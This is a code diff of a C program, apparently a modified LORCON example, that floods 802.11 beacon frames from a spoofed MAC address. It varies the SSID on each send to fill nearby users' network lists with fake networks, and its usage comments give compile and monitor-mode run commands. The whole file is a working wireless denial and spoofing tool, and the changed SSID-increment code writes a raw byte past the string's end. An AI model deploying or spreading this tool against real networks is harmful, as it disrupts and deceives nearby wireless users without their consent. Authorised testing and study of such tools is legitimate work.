@@ -1,184 +1,183 @@
 /*
-  
-  This is a modified version of a Lorcon example written by 
-  brad.antoniewicz@foundstone.com. It was modified add a new value in the 
-  ssid each send to flood available network lists.
-  
+ *
+===
+usage-
+to compile:
+gcc -o BeaconFlooder -lorcon2 BeaconFlooder.c
+
+Put your alpha card in monitor mode, and run:
+sudo airmon-ng start wls160u4u1
+sudo ./beacon_flood_lcpa -s [SSID_HERE] -i wls160u4u1mon -c 11
+===
+This is a modified version of a Lorcon example written by
+brad.antoniewicz@foundstone.com
 */
 
 #include <stdio.h>
 #include <getopt.h>
 #include <string.h>
-
-#include <sys/time.h> // Needed for timestamp
-
-#include <lorcon2/lorcon.h> // For LORCON 
-#include <lorcon2/lorcon_packasm.h> // For metapack packet assembly
+#include <sys/time.h>
+#include <lorcon2/lorcon.h>
+#include <lorcon2/lorcon_packasm.h>
 
 void usage(char *argv[]) {
-	printf("\t-s <SSID>\tSSID to flood\n");
-	printf("\t-i <int> \tInterface\n");
-	printf("\t-c <channel>\tChannel\n");
-	printf("\nExample:\n");
-	printf("\t%s -s brad -i wlan0 -c 1\n\n",argv[0]);
+        printf("\t-s <SSID>\tSSID to flood\n");
+        printf("\t-i <int> \tInterface\n");
+        printf("\t-c <channel>\tChannel\n");
+        printf("\nExample:\n");
+        printf("\t%s -s [SSID] -i wlan0 -c 11\n\n",argv[0]);
 }
+
 int main(int argc, char *argv[]) {
 
-	char *interface = NULL; 
-  char *ssid = NULL;
-	int c;
-	uint8_t channel;
-	unsigned int count=0;
-  int ssidAdded;
-	lorcon_driver_t *drvlist, *driver; // Needed to set up interface/context
-	lorcon_t *context; // LORCON context
+    char *interface = NULL;
+    char *ssid = NULL;
+    int c;
+    uint8_t channel;
+    unsigned int count=0;
+    int ssidAdded;
 
-	lcpa_metapack_t *metapack; // metapack for LORCON packet assembly 
-	lorcon_packet_t *txpack; // The raw packet to be sent
+    lorcon_driver_t *drvlist, *driver;
+    lorcon_t *context;
+    lcpa_metapack_t *metapack;
+    lorcon_packet_t *txpack;
 
-	/* 
-		These are needed for the actual beacon frame
-	*/
-		
-	// BSSID and source MAC address
-	uint8_t *mac = "\x00\xDE\xAD\xBE\xEF\x00";
+    //Beacon frame setup
 
-	// Timestamp
-        struct timeval time; 
-        uint64_t timestamp; 
-	
-	// Supported Rates  
-	uint8_t rates[] = "\x8c\x12\x98\x24\xb0\x48\x60\x6c"; // 6,9,12,18,24,36,48,54
+    // BSSID and source MAC address
+    uint8_t *mac = "\x00\xDE\xAD\xBE\xEF\x00";
 
-	// Beacon Interval
-	int interval = 1;
+    // Timestamp
+    struct timeval time;
+    uint64_t timestamp;
 
-	// Capabilities
-	int capabilities = 0x0421;
+    // Supported Rates (6,9,12,18,24,36,48,54)
+    uint8_t rates[] = "\x8c\x12\x98\x24\xb0\x48\x60\x6c";
+
+    // * Beacon Interval
+    int interval = 1;
+
+    // Capabilities
+    int capabilities = 0x0421;
 
 
-	printf ("%s - Simple 802.11 Beacon Flooder\n", argv[0]);
-	printf ("-----------------------------------------------------\n\n");
+        printf ("%s - Simple 802.11 Beacon Flooder\n", argv[0]);
+        printf ("-----------------------------------------------------\n\n");
 
-	/* 
-		This handles all of the command line arguments
-	*/
-	
-	while ((c = getopt(argc, argv, "i:s:hc:")) != EOF) {
-		switch (c) {
-			case 'i': 
-				interface = strdup(optarg);
-				break;
-			case 's': 
-				if ( strlen(strdup(optarg)) < 255 ) {
-					ssid = strdup(optarg);
-				} else {
-					printf("ERROR: SSID Length too long! Should not exceed 255 characters\n");
-					return -1;
-				}
-				break;
-			case 'c':
-				channel = atoi(optarg);
-				break;
-			case 'h':
-				usage(argv);
-				break;
-			default:
-				usage(argv);
-				break;
-			}
-	}
+        /*
+                This handles all of the command line arguments
+        */
 
-	if ( interface == NULL || ssid == NULL ) { 
-		printf ("ERROR: Interface, channel, or SSID not set (see -h for more info)\n");
-		return -1;
-	}
-
-	printf("[+] Using interface %s\n",interface);
-	
-	/*	
-	 	The following is all of the standard interface, driver, and context setup
-	*/
-
-	// Automatically determine the driver of the interface
-	
-	if ( (driver = lorcon_auto_driver(interface)) == NULL) {
-		printf("[!] Could not determine the driver for %s\n",interface);
-		return -1;
-	} else {
-		printf("[+]\t Driver: %s\n",driver->name);
-	}
-
-	// Create LORCON context
-        if ((context = lorcon_create(interface, driver)) == NULL) {
-                printf("[!]\t Failed to create context");
-               	return -1; 
+        while ((c = getopt(argc, argv, "i:s:hc:")) != EOF) {
+                switch (c) {
+                        case 'i':
+                                interface = strdup(optarg);
+                                break;
+                        case 's':
+                                if ( strlen(strdup(optarg)) < 255 ) {
+                                        ssid = strdup(optarg);
+                                } else {
+                                        printf("ERROR: SSID Length too long! Should not exceed 255 characters\n");
+                                        return -1;
+                                }
+                                break;
+                        case 'c':
+                                channel = atoi(optarg);
+                                break;
+                        case 'h':
+                                usage(argv);
+                                break;
+                        default:
+                                usage(argv);
+                                break;
+                        }
         }
 
-	// Create Monitor Mode Interface
-	if (lorcon_open_injmon(context) < 0) {
-		printf("[!]\t Could not create Monitor Mode interface!\n");
-		return -1;
-	} else {
-		printf("[+]\t Monitor Mode VAP: %s\n",lorcon_get_vap(context));
-		lorcon_free_driver_list(driver);
-	}
+        if ( interface == NULL || ssid == NULL ) {
+                printf ("ERROR: Interface, channel, or SSID not set (see -h for more info)\n");
+                return -1;
+        }
 
-	// Set the channel we'll be injecting on
-	lorcon_set_channel(context, channel);
-	printf("[+]\t Using channel: %d\n\n",channel);
+        printf("[+] Using interface %s\n",interface);
 
-	/* 
-		The following is the packet creation and sending code
-	*/
+        /*
+                The following is all of the standard interface, driver, and context setup
+        */
 
-	// Keep sending frames until interrupted
-	while(1) {
+        // Automatically determine the driver of the interface
 
-		// Create timestamp
-		gettimeofday(&time, NULL);
-		timestamp = time.tv_sec * 1000000 + time.tv_usec;
+        if ( (driver = lorcon_auto_driver(interface)) == NULL) {
+                printf("[!] Could not determine the driver for %s\n",interface);
+                return -1;
+        } else {
+                printf("[+]\t Driver: %s\n",driver->name);
+        }
 
-		// Initialize the LORCON metapack	
-		metapack = lcpa_init();
-		
-		// Create a Beacon frame from 00:DE:AD:BE:EF:00
-		lcpf_beacon(metapack, mac, mac, 0x00, 0x00, 0x00, 0x00, timestamp, interval, capabilities);
+        // Create LORCON context
+        if ((context = lorcon_create(interface, driver)) == NULL) {
+                printf("[!]\t Failed to create context");
+                return -1;
+        }
 
-		// Append IE Tag 0 for SSID
-		lcpf_add_ie(metapack, 0, strlen(ssid),ssid);
-	
-		// Convert the LORCON metapack to a LORCON packet for sending
-		txpack = (lorcon_packet_t *) lorcon_packet_from_lcpa(context, metapack);
-		
-		// Send and exit if error
-		if ( lorcon_inject(context,txpack) < 0 ) 
-			return -1;
-               // Wait interval before next beacon
+        // Create Monitor Mode Interface
+        if (lorcon_open_injmon(context) < 0) {
+                printf("[!]\t Could not create Monitor Mode interface!\n");
+                return -1;
+        } else {
+                printf("[+]\t Monitor Mode VAP: %s\n",lorcon_get_vap(context));
+                lorcon_free_driver_list(driver);
+        }
 
-                //Increment a value in SSID and Mac address
-                ssidAdded = ssidAdded + 1;
-                printf("ssidAdded: %i\n",ssidAdded);
-                sprintf(ssid, "XXXX %d", ssidAdded);
-                printf("ssid: %s\n",ssid);
-                
-                usleep(interval * 1000);
+        // Set the channel we'll be injecting on
+        lorcon_set_channel(context, channel);
+        printf("[+]\t Using channel: %d\n\n",channel);
+ 
+        // Set initial value to trailing variable, and get length of SSID
+        ssidAdded=0;
+        int ssidLength = strlen(ssid);
 
-		// Print nice and pretty
-		//printf("\033[K\r");
-		printf("[+] Sent %d frames \n", count);
-		fflush(stdout);
-		count++;
+        // Send frames
+        while(1) {
 
-		// Free the metapack
-		lcpa_free(metapack);
-	}
-// Cleanup
-	// Close the interface
-	lorcon_close(context);
+                // Create timestamp
+                gettimeofday(&time, NULL);
+                timestamp = time.tv_sec * 1000000 + time.tv_usec;
 
-	// Free the LORCON Context
-	lorcon_free(context);	
-	
-	return 0;
+                // Initialize the LORCON metapack
+                metapack = lcpa_init();
+
+                // Create a Beacon frame from 00:DE:AD:BE:EF:00
+                lcpf_beacon(metapack, mac, mac, 0x00, 0x00, 0x00, 0x00, timestamp, interval, capabilities);
+
+                // Append IE Tag 0 for SSID
+                lcpf_add_ie(metapack, 0, strlen(ssid),ssid);
+
+                // Convert the LORCON metapack to a LORCON packet for sending
+                txpack = (lorcon_packet_t *) lorcon_packet_from_lcpa(context, metapack);
+
+                // Send and exit if error
+                if ( lorcon_inject(context,txpack) < 0 )
+                        return -1;
+               
+                //Increment a value in SSID
+                ssidAdded++; 
+                ssid[ssidLength]=ssidAdded;
+
+                usleep(interval * 1000); //*
+
+              // Print nice and pretty
+                printf("\033[K\r");
+                printf("[+] Sent %d frames\n", count);
+                fflush(stdout);
+                count++;
+
+
+                lcpa_free(metapack);
+        }
+
+  // Cleanup
+  lorcon_close(context);
+  lorcon_free(context);
+
+  return 0;
 }
